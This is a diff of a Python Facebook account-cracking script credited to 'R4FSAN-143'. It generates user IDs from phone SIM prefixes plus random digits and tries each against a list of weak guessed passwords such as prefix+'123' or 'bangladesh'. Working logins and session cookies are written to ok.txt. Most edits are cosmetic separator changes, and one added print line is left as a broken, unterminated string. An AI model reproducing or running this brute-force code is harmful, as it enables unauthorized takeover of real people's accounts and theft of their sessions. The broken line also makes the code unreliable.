@@ -82,7 +82,7 @@ logo = ("""\x1b[1;97m
 88`8b   88°°°88 88°°°°    `Y8b. 88°°°88 88 V8o88 
 88 `88. 88   88 88      db   8D 88   88 88  V888 
 88   YD YP   YP YP      `8888Y' YP   YP VP   V8P 
-\x1b[1;97m===================================================
+\x1b[1;97mprint(50*'=')
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m AUTHOR  : RAFSAN AHAMMED RAFI
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m FACEBOOK: MD. ARIF MIA
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m GITHUB  : R4FSAN-143
@@ -90,8 +90,7 @@ logo = ("""\x1b[1;97m
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m TOOLS   : AUTO CRACK
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m Stetus  : FREE
 \033[38;5;196m[\033[38;5;195m★\033[38;5;196m]\x1b[1;97m VIRSION : 0.1.9
-====================================================
-""")
+print(50*'=')""")
 
 class Main:
     def __init__(self):
@@ -146,7 +145,7 @@ def v1():
     print(50*'_')
     print(' [♤] Crack process has been completed')
     print(' [♤] Ids saved in ok.txt,cp.txt')
-    print(50*'=')
+    print(50*'_')
 def v2():
     user=[]
     os.system('clear')
@@ -167,7 +166,7 @@ def v2():
         print(f"\033[1;97m [♤]  Target Doamin:\033[1;92m Facebook CLONING (name)")
         print(' \033[1;97m[♤]  The process has been started')
         print(' [♤]  Wait for ids ')
-        print(50*'=')
+        print(50*'_')
         for guru in user:
             uid = kode+doamin+kodex+guru
             pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
@@ -181,6 +180,7 @@ def v3():
     os.system('clear')
     os.system('xdg-open https://facebook.com/groups/3206414299669908/')
     print(logo)
+    print("[017]  [016]   [018]   [019]
     kode = input(' [√] Enter sim code: ')
     kodex = ''.join(random.choice(string.digits) for _ in range(2))
     kod = ''.join(random.choice(string.digits) for _ in range(2))
@@ -198,7 +198,7 @@ def v3():
         print(f"\033[1;97m [√]  Target Doamin:\033[1;92m {doamin}")
         print(' \033[1;97m[√]  The process has been started')
         print(' [√]  Wait for ids ')
-        print(50*'=')
+        print(50*'_')
         for guru in user:
             uid = kode+kodex+kod+guru
             pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh']
@@ -206,7 +206,7 @@ def v3():
     print(50*'_')
     print(' [√] Crack process has been completed')
     print(' [√] Ids saved in ok.txt,cp.txt')
-    print(50*'=')
+    print(50*'_')
 def rcrack1(uid,pwx,tl):
     global loop
     global cps
@@ -253,8 +253,6 @@ def rcrack1(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
                 print(f"\033[38;5;46m[R4FSAN-OK] {uid}|{ps}")
-                print(f" \n Cookie : {coki}")
-                print(f" \n ===================================================")
                 open('/sdcard/R4FSAN/ok.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
